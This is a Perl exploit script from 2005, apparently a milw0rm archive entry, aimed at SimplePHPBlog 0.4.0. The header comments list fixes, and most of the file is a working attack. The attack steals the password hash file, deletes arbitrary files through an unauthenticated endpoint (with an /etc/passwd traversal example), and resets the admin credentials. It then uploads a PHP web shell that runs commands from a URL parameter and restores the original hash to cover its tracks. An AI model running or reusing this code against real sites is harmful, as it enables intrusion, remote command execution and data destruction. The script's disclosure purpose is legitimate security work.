#!/usr/bin/perl -w
#===============================================================================
#	Title:		sphpblog_vulns.pl
#
#	Written by: 	Kenneth F. Belva, CISSP
#			Franklin Technologies Unlimited, Inc.
#			http://www.ftusecurity.com
#
#	Date: 		August 25, 2005
#
#	Version:	0.1
#
#	Description:	This program is for educational purposes only!
#			SimplePHPBlog as a few vulnerability which this
#			perl script demonstrates via an exploit.
#
#	Instructions:	Should be self-explanatory via the .pl help menu
#
#	Solutions:	
#			*** Solution 1
#			Change the line in comment_delete_cgi.php from
#			$logged_in = logged_in( false, true );    to
#			$logged_in = logged_in( true, true );
#
#			*** Solution 2
#			Place an .htaccess file with the following config in
#			the ./config directory:
#
#
#			#---------------------
#			#Snip .htaccess start
#			#---------------------			
#			IndexIgnore *
#
#			<Files .htaccess>
#			order allow,deny
#			deny from all
#			</Files>
#			
#			<Files *.txt>
#			order allow,deny
#			deny from all
#			</Files>
#			#---------------------
#			#Snip .htaccess end
#			#---------------------
#
#
#			*** Solution 3
#			See http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0885.html
#				for PHP modification to upload image script.
#===============================================================================



#-------------------------------------------------------------------------------
#	Global Paramaters
#-------------------------------------------------------------------------------
use strict;
use warnings;

use vars qw/ %args /;

use Getopt::Std;
require LWP::UserAgent;
my $ua = LWP::UserAgent->new;

#-------------------------------------------------------------------------------
#	Global Routines
#-------------------------------------------------------------------------------

#Determine Operating System
my $OperatingSystem = $^O;
my $unix = "";

#Set OS Parameter
if (index(lc($OperatingSystem),"win")!=-1){
		   $unix="0"; #windows system
	    }else{
		    $unix="1"; #unix system
	    }

#-------------------------------------------------------------------------------
#	The Main Menu
#-------------------------------------------------------------------------------

sub menu()
    {
	    if ($unix){system("clear");}
	    	else{system("cls");}

	    print "
________________________________________________________________________________
		  SimplePHPBlog v0.4.0 Exploits
			     by
		     Kenneth F. Belva, CISSP
		   http://www.ftusecurity.com
________________________________________________________________________________

	Program	: $0
	Version	: v0.1
	Date	: 8/25/2005
	Descript: This perl script demonstrates a few flaws in
		  SimplePHPBlog.
	
	Comments: THIS PoC IS FOR EDUCATIONAL PURPOSES ONLY...
		  DO NOT RUN THIS AGAINST SYSTEMS TO WHICH YOU DO 
		  NOT HAVE PERMISSION TO DO SO!
		  
		  Please see this script comments for solution/fixes 
		  to demonstrated vulnerabilities. 
		  http://www.simplephpblog.com

	Usage	: $0 [-h host] [-e exploit]
	
		-?      : this menu
		-h      : host
		-e	: exploit
			(1)	: Upload cmd.php in [site]/images/
			(2)	: Retreive Password file (hash)
			(3)	: Set New User Name and Password
				[NOTE - uppercase switches for exploits]
				-U	: user name
				-P	: password
			(4)	: Delete a System File
				-F	: Path and System File 

	Examples: $0 -h 127.0.0.1 -e 2
		  $0 -h 127.0.0.1 -e 3 -U l33t -P l33t
		  $0 -h 127.0.0.1 -e 4 -F ./index.php
		  $0 -h 127.0.0.1 -e 4 -F ../../../etc/passwd
		  $0 -h 127.0.0.1 -e 1
	";	
        
	exit;
    }


#-------------------------------------------------------------------------------
#	Initial Routine
#-------------------------------------------------------------------------------

    sub init()
    {

	use Switch;
	
	# colon ':' after letter says that option takes variable
        my $opt_string = 'e:U:P:h:F:?';
        getopts( "$opt_string", \%args ) or menu();
	
	#Load parameters
	my $exploit = $args{e};
	my $host = $args{h};
	my $user = $args{U};
	my $pass = $args{P};
	my $file = $args{F};
	
	# What shall we do today?
	switch (%args) {
		case "?"	{ menu();}
		case "e"	{
				switch ($exploit) {
					
					if ($unix){system("clear");}
					else{system("cls");}
					
					print "
________________________________________________________________________________
		  SimplePHPBlog v0.4.0 Exploits
			     by
		     Kenneth F. Belva, CISSP
		    http://www.ftusecurity.com
________________________________________________________________________________";


					# Upload cmd.php to /images
					case "1" {	print "\nRunning cmd.php Upload Exploit....\n\n";
							&UploadCmdPHP($host);}
					# Retrieve Username & Password hash
					case "2" {	print "\nRunning Username and Password Hash Retrieval Exploit....\n\n";
							&RetrievePwd($host."/config/password.txt");}
					# Replace Username and Password
					case "3" {	print "\nRunning Set New Username and Password Exploit....\n\n";
							&SetUserPwd($host,$user,$pass);}
					# Delete a System File
					case "4" {	print "\nRunning Delete System File Exploit....\n\n";
							&DeleteFile($host . "/comment_delete_cgi.php?y=05&m=08&comment=",$file);}

					} #end $exploit switch
					print "\n\n\n*** Exploit Completed....\nHave a nice day! :)\n";
				} #end "e" case
		else		{ menu();}
		} #end %args switch

    } #end sub init

#-------------------------------------------------------------------------------
#	Exploit #1: Upload File Via POST 
#-------------------------------------------------------------------------------

sub UploadCmdPHP {

	
	my($url) = @_;
	
	use LWP;
	use HTTP::Request::Common qw(POST);
	my $ua = LWP::UserAgent->new;
	
	$HTTP::Request::Common::DYNAMIC_FILE_UPLOAD++;

	#Step 1: Retrieve hash
	#-----------------------------------------------------------------------
	my $hash = &RetrievePwd($url."/config/password.txt");
	

	#Step 2: Delete Existing Password file (SetUserPwd)
	#Step 3: Create a temporary user id and password (SetUserPwd)
	#-----------------------------------------------------------------------
	&SetUserPwd($url,"a","a");
	

	#Step 4: Log into the app and get the PHPSession / my_id session variable
	#-----------------------------------------------------------------------
	my $SETcookie = &strip_session(&Login($url . "/login_cgi.php","a","a"));
	
	
	#Step 5: Create and upload our scripts (cmd.php & reset.php)
	#-----------------------------------------------------------------------
		&CreateTempPHPs();
	
	# Upload cmd.php
	my $path = "./cmd.php";
	my $file = "cmd.php";
	my $req = POST($url."/upload_img_cgi.php",
		Cookie => 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,
		Content_Type => 'form-data',
		Content => [userfile => [$path,$file],],
		);
	
	my $response = $ua->request($req);
	print "\nCreated cmd.php on target host: " . $url;
	#$response->is_success or die "Failed to POST '$url': ", $response->status_line;
	#return $response->as_string;
	
	# Upload reset.php
	$path = "./reset.php";
	$file = "reset.php";
		
	$req = POST($url."/upload_img_cgi.php",
		Cookie => 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,
		Content_Type => 'form-data',
		Content => [userfile => [$path,$file],],
		);
	
	$response = $ua->request($req);
	print "\nCreated reset.php on target host: " . $url;
	#$response->is_success or die "Failed to POST '$url': ", $response->status_line;
	#return $response->as_string;
	
		#Remove local PHP files
		&RemoveTempPHPs();

		
	#Step 6: Reset origional Passwpord
	#-----------------------------------------------------------------------
	&ResetHash($url."/images/reset.php",$hash);

	
	#Step 7: Pass command to delete reset.php (clean up)
	#-----------------------------------------------------------------------
	&DeleteFile($url . "/comment_delete_cgi.php?y=05&m=08&comment=","./images/reset.php");
	print "\nRemoved reset.php from target host: " . $url;

	print "\n\nTo run command please go to following link: \n\t" . $url."/images/cmd.php?cmd=[your command]";
}

#-------------------------------------------------------------------------------
#	Exploit #2: Retrieve Password File 
#-------------------------------------------------------------------------------

sub RetrievePwd {
	
	my($url) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent->new;

	my $req = GET($url);
	
	my $response = $ua->request($req);

	$response->is_success or die "Failed to POST '$url': ", $response->status_line;
	
	my $hash = $response->content;
	print "\nRetrieved Username and Password Hash: " . $hash; 
	return $hash

}


#-------------------------------------------------------------------------------
#	Exploit #3: Set New Username and Password 
#-------------------------------------------------------------------------------

sub SetUserPwd{

	my($url,$user,$pass) = @_;

	&DeleteFile($url . "/comment_delete_cgi.php?y=05&m=08&comment=", "./config/password.txt");
	&ResetPwd($url . "/install03_cgi.php?blog_language=english",$user,$pass);
}


#-------------------------------------------------------------------------------
#	POST to Reset Username and Password (must delete password file first)
#-------------------------------------------------------------------------------

sub ResetPwd {
	
	my($url,$user,$pass) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent->new;

	my $req = POST($url,
		      [ user  => $user,
			pass => $pass,
			submit => '%C2%A0Submit%C2%A0'
			]
		);
	
	my $response = $ua->request($req);

	$response->is_success or die "Failed to POST '$url': ", $response->status_line;

	print "\n./config/password.txt created!";
	print "\nUsername is set to: ".$user;
	print "\nPassword is set to: ".$pass;
	
}


#-------------------------------------------------------------------------------
#	Exploit #4: Delete Password File 
#-------------------------------------------------------------------------------

sub DeleteFile {
	
	my($url,$file) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent->new;

	my $req = GET($url.$file);
	
	my $response = $ua->request($req);

	$response->is_success or die "Failed to POST '$url': ", $response->status_line;
	print "\nDeleted File: ".$file; 
	
}


#-------------------------------------------------------------------------------
#	log into site
#-------------------------------------------------------------------------------

sub Login {

	my($url,$user,$pass) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent->new;

	my $req = POST($url,
		      [ user  => $user,
			pass => $pass,
			submit => '%C2%A0Submit%C2%A0'
			]
		);
	
	my $response = $ua->request($req);

	$response->is_success or die "Failed to POST '$url': ", $response->status_line;

	print "\nLogged into SimplePHPBlog at: ".$url;
	print "\nCurrent Username '".$user."' and Password '".$pass."'...";
	
	return $response->header('Set-Cookie');
	
}


#-------------------------------------------------------------------------------
#	POST the hash
#-------------------------------------------------------------------------------

sub ResetHash {

	my($url,$hash) = @_;
	
	use LWP;
	use HTTP::Request::Common;
	my $ua = LWP::UserAgent->new;

	my $req = POST($url,
		      [ hash  => $hash]
		);
	
	my $response = $ua->request($req);

	$response->is_success or die "Failed to POST '$url': ", $response->status_line;

	print "\nReset Hash at: ".$url;
	print "\nReset Hash value: ".$hash;
	
	
}


#------------------------------------------------------
# Create Temp PHP files
#------------------------------------------------------

sub CreateTempPHPs{

	my($hash) = @_;

	open(PHPFILE, ">./cmd.php");
	print PHPFILE &CreateCmdPHP();
	close PHPFILE;
	print "\nCreated cmd.php on your local machine.";
	
	open(PHPFILE, ">./reset.php");
	print PHPFILE &CreateResetPHP();
	close PHPFILE;
	print "\nCreated reset.php on your local machine.";	
}

#------------------------------------------------------
# Remove Temp PHP files
#------------------------------------------------------

sub RemoveTempPHPs{

	unlink("./cmd.php");
	print "\nRemoved cmd.php from your local machine.";
	unlink("./reset.php");
	print "\nRemoved reset.php from your local machine.";
	
}


#------------------------------------------------------
# strip_session - Get PHP Session Variable
#------------------------------------------------------

sub strip_session {
	
	my($savedata) = @_;

	my $PHPstring = "PHPSESSID";
	my $semi = "\;";
	
	my $datalength = length($savedata);
	my $PHPstart= (index $savedata, $PHPstring)+10;
	my $PHPend = index $savedata,$semi,$PHPstart;
	my $PHPsession= substr $savedata, $PHPstart, ($PHPend-$PHPstart);
	return $PHPsession;
	
}


sub CreateCmdPHP(){
	
	return "

<?php

\$cmd = \$_GET[\'cmd\'];
echo \'<hr/><pre>\';
echo \'Command: \' . \$cmd;
echo '</pre><hr/><br>';

echo '<pre>';
\$last_line = system(\$cmd,\$output);
echo \'</pre><hr/>\';
?>.
"; # end 
	
}


sub CreateResetPHP(){
	
	return "

<?php

\$hash = \$_POST[\'hash\'];
\$fp = fopen(\"../config/password.txt\",\"w\");
fwrite(\$fp,\$hash);
fpclose(\$fp);

?>
"; #end return

}


#------------------------------------------------------
# 	Begin Routines
#------------------------------------------------------
	init();

# milw0rm.com [2005-09-01]
